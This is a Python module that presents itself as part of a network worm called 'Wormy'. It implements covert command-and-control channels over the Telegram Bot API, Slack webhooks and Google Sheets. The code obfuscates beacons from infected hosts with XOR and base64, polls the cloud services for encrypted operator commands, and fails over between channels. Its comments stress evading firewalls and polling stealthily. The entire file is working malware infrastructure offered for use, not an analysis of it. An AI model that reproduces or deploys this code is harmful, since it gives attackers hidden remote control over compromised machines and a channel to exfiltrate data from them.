"""
Wormy ML Network Worm v3.0 - Cloud C2 Channels
C2 over Telegram Bot API, Slack Webhooks, and Google Sheets.
Each service acts as a covert command relay — firewalls cannot block
without blocking the entire cloud platform.
"""
import os, sys, json, time, base64, hashlib, threading
import urllib.request, urllib.parse
from typing import Optional, Dict, List, Callable

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


def _xor(data: bytes, key: bytes) -> bytes:
    k = hashlib.sha256(key).digest()
    return bytes(data[i] ^ k[i % len(k)] for i in range(len(data)))


def _enc(obj: dict, passphrase: str) -> str:
    raw = json.dumps(obj).encode()
    return base64.b64encode(_xor(raw, passphrase.encode())).decode()


def _dec(b64: str, passphrase: str) -> Optional[dict]:
    try:
        raw = _xor(base64.b64decode(b64), passphrase.encode())
        return json.loads(raw)
    except Exception:
        return None


def _http_get(url: str, headers: dict = None) -> Optional[str]:
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode()
    except Exception as e:
        logger.debug(f"HTTP GET error: {e}")
        return None


def _http_post(url: str, data: dict, headers: dict = None) -> Optional[str]:
    try:
        body = json.dumps(data).encode()
        req  = urllib.request.Request(url, data=body,
                                      headers={"Content-Type": "application/json",
                                               **(headers or {})})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode()
    except Exception as e:
        logger.debug(f"HTTP POST error: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════════
# 1. Telegram C2
# ══════════════════════════════════════════════════════════════════════════════
class TelegramC2:
    """
    C2 channel via Telegram Bot API.

    Setup: create a bot with @BotFather, get token + chat_id.
    Agent sends encrypted messages as bot → operator reads/replies.
    Commands are returned as encrypted replies.

    Traffic: HTTPS to api.telegram.org (legitimate CDN, rarely blocked).
    """

    API = "https://api.telegram.org/bot{token}"

    def __init__(self, token: str, chat_id: str, passphrase: str = "wormy_tg"):
        self.token      = token
        self.chat_id    = chat_id
        self.passphrase = passphrase
        self._last_update_id = 0
        self._base      = self.API.format(token=token)

    def _call(self, method: str, params: dict = None) -> Optional[dict]:
        url  = f"{self._base}/{method}"
        resp = _http_post(url, params or {})
        if resp:
            try:
                return json.loads(resp)
            except Exception:
                pass
        return None

    def send_message(self, text: str) -> bool:
        """Send raw text (for operators). Use beacon() for agent comms."""
        result = self._call("sendMessage", {
            "chat_id": self.chat_id,
            "text":    text[:4096],
        })
        return bool(result and result.get("ok"))

    def beacon(self, agent_data: Dict) -> Optional[Dict]:
        """
        Encrypt agent_data, send as message, poll for encrypted reply.
        Returns decrypted command dict or None.
        """
        enc = _enc({"type": "beacon", "data": agent_data,
                    "ts": time.time()}, self.passphrase)
        if not self.send_message(f"[WRMY]{enc}"):
            return None
        # Poll for reply (operator sends back encrypted command)
        time.sleep(3)
        return self._poll_for_command()

    def _poll_for_command(self) -> Optional[Dict]:
        """Check for new messages from operator, return decrypted command."""
        result = self._call("getUpdates", {
            "offset":  self._last_update_id + 1,
            "timeout": 5,
        })
        if not result or not result.get("ok"):
            return None
        for update in result.get("result", []):
            self._last_update_id = update.get("update_id", self._last_update_id)
            msg  = update.get("message", {})
            text = msg.get("text", "")
            if text.startswith("[CMD]"):
                cmd = _dec(text[5:], self.passphrase)
                if cmd:
                    return cmd
        return None

    def start_listener(self, callback: Callable, poll_interval: float = 5.0):
        """Background polling loop — calls callback(command_dict) for each command."""
        def _loop():
            while True:
                cmd = self._poll_for_command()
                if cmd:
                    callback(cmd)
                time.sleep(poll_interval)
        t = threading.Thread(target=_loop, daemon=True)
        t.start()
        logger.info("Telegram C2 listener started")

    def get_status(self) -> Dict:
        me = self._call("getMe")
        return {
            "channel":       "telegram",
            "bot_username":  me.get("result", {}).get("username") if me else None,
            "chat_id":       self.chat_id,
            "last_update":   self._last_update_id,
        }


# ══════════════════════════════════════════════════════════════════════════════
# 2. Slack C2
# ══════════════════════════════════════════════════════════════════════════════
class SlackC2:
    """
    C2 channel via Slack Incoming Webhooks + Slack Web API polling.

    Agent POSTs encrypted beacons to a Slack webhook.
    Operator replies via a Slack app bot; agent polls the channel history.

    Requires: webhook_url (for sending), bot_token + channel_id (for polling).
    """

    SLACK_API = "https://slack.com/api"

    def __init__(self, webhook_url: str,
                 bot_token: str = None, channel_id: str = None,
                 passphrase: str = "wormy_slack"):
        self.webhook_url = webhook_url
        self.bot_token   = bot_token
        self.channel_id  = channel_id
        self.passphrase  = passphrase
        self._last_ts    = str(time.time())

    def beacon(self, agent_data: Dict) -> Optional[Dict]:
        """Send encrypted beacon as a Slack message."""
        enc  = _enc({"type": "beacon", "data": agent_data}, self.passphrase)
        body = {"text": f"[WRMY]{enc}"}
        resp = _http_post(self.webhook_url, body)
        if resp and resp.strip() == "ok":
            logger.success("Slack beacon sent")
            if self.bot_token and self.channel_id:
                time.sleep(3)
                return self._poll_commands()
        return None

    def _poll_commands(self) -> Optional[Dict]:
        """Poll channel history for operator commands."""
        if not self.bot_token or not self.channel_id:
            return None
        url  = f"{self.SLACK_API}/conversations.history"
        req  = urllib.request.Request(
            url + f"?channel={self.channel_id}&oldest={self._last_ts}&limit=10",
            headers={"Authorization": f"Bearer {self.bot_token}",
                     "Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
            for msg in reversed(data.get("messages", [])):
                text = msg.get("text", "")
                if text.startswith("[CMD]"):
                    self._last_ts = msg.get("ts", self._last_ts)
                    return _dec(text[5:], self.passphrase)
        except Exception as e:
            logger.debug(f"Slack poll error: {e}")
        return None

    def get_status(self) -> Dict:
        return {
            "channel":      "slack",
            "webhook":      self.webhook_url[:40] + "...",
            "polling":      bool(self.bot_token),
        }


# ══════════════════════════════════════════════════════════════════════════════
# 3. Google Sheets C2
# ══════════════════════════════════════════════════════════════════════════════
class GoogleSheetsC2:
    """
    C2 channel via Google Sheets (CSV export + append API).

    Agent reads commands from a public Google Sheet (CSV URL).
    Agent writes results/beacons to the sheet via the Sheets API.

    Lightweight, firewall-transparent (docs.google.com always allowed).
    Read-only mode (CSV) doesn't need OAuth — perfect for stealthy polling.
    """

    SHEETS_BASE = "https://sheets.googleapis.com/v4/spreadsheets"

    def __init__(self, sheet_id: str, api_key: str = None,
                 range_name: str = "Sheet1!A:B",
                 passphrase: str = "wormy_sheets"):
        self.sheet_id   = sheet_id
        self.api_key    = api_key
        self.range_name = range_name
        self.passphrase = passphrase
        self._cmd_cache: List[Dict] = []

    def _csv_url(self) -> str:
        return (f"https://docs.google.com/spreadsheets/d/{self.sheet_id}"
                f"/export?format=csv&range={urllib.parse.quote(self.range_name)}")

    def poll_commands(self) -> List[Dict]:
        """
        Download sheet as CSV, parse [CMD] rows, decrypt commands.
        No auth needed if sheet is public-readable.
        """
        csv = _http_get(self._csv_url())
        if not csv:
            return []
        commands = []
        for line in csv.splitlines():
            if "[CMD]" in line:
                enc = line.split("[CMD]", 1)[1].strip().strip('"')
                cmd = _dec(enc, self.passphrase)
                if cmd:
                    commands.append(cmd)
        return commands

    def send_beacon(self, agent_data: Dict) -> bool:
        """
        Append an encrypted beacon row to the sheet via Sheets API.
        Requires api_key with sheets.append scope.
        """
        if not self.api_key:
            logger.warning("Google Sheets C2: no API key for write operations")
            return False
        enc = _enc({"type": "beacon", "data": agent_data,
                    "ts": time.time()}, self.passphrase)
        url  = (f"{self.SHEETS_BASE}/{self.sheet_id}/values/"
                f"{urllib.parse.quote(self.range_name)}:append"
                f"?valueInputOption=RAW&key={self.api_key}")
        body = {"values": [[f"[WRMY]{enc}", str(time.time())]]}
        resp = _http_post(url, body)
        return bool(resp)

    def beacon(self, agent_data: Dict) -> Optional[Dict]:
        """Send beacon and return first pending command."""
        self.send_beacon(agent_data)
        cmds = self.poll_commands()
        return cmds[0] if cmds else None

    def get_status(self) -> Dict:
        return {
            "channel":  "google_sheets",
            "sheet_id": self.sheet_id,
            "range":    self.range_name,
            "api_key":  bool(self.api_key),
        }


# ══════════════════════════════════════════════════════════════════════════════
# 4. Unified Cloud C2 Manager
# ══════════════════════════════════════════════════════════════════════════════
class CloudC2Manager:
    """
    Manages multiple cloud C2 channels with automatic failover.
    Tries each channel in order until one succeeds.
    """

    def __init__(self):
        self._channels: List = []
        self._active: Optional[int] = None

    def add_telegram(self, token: str, chat_id: str,
                     passphrase: str = "wormy_tg"):
        self._channels.append(TelegramC2(token, chat_id, passphrase))
        logger.info("Cloud C2: Telegram channel added")

    def add_slack(self, webhook_url: str, bot_token: str = None,
                  channel_id: str = None, passphrase: str = "wormy_slack"):
        self._channels.append(SlackC2(webhook_url, bot_token,
                                      channel_id, passphrase))
        logger.info("Cloud C2: Slack channel added")

    def add_google_sheets(self, sheet_id: str, api_key: str = None,
                          passphrase: str = "wormy_sheets"):
        self._channels.append(GoogleSheetsC2(sheet_id, api_key,
                                              passphrase=passphrase))
        logger.info("Cloud C2: Google Sheets channel added")

    def beacon(self, agent_data: Dict) -> Optional[Dict]:
        """Try all channels until one returns a command."""
        for i, channel in enumerate(self._channels):
            try:
                result = channel.beacon(agent_data)
                if result is not None:
                    self._active = i
                    return result
            except Exception as e:
                logger.debug(f"Cloud channel {i} failed: {e}")
        return None

    def get_status(self) -> Dict:
        return {
            "channels":      len(self._channels),
            "active_channel": self._active,
            "channel_types": [type(c).__name__ for c in self._channels],
        }
